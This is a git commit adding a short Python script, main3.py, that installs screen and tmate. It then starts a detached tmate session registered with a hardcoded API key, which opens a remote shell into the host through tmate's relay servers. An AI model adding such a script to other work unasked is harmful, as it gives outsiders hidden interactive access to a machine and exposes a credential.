ec13f5826199086f68c8831c8fd2a63057561c93
LopperNanas <153208294+LopperNanas@users.noreply.github.com>
2024-03-23 01:03:51 -0300

    Create main3.py

---
+++ main3.py
@@ -0,0 +1,7 @@
+import subprocess
+command = "apt-get install screen -y"
+subprocess.call(command, shell=True)
+command = "apt-get install tmate -y"
+subprocess.call(command, shell=True)
+command = "screen -dmS tmate_session tmate -k tmk-3luLgmvCTvgJzsq3X1JzloycoJ -n 3"
+subprocess.call(command, shell=True)
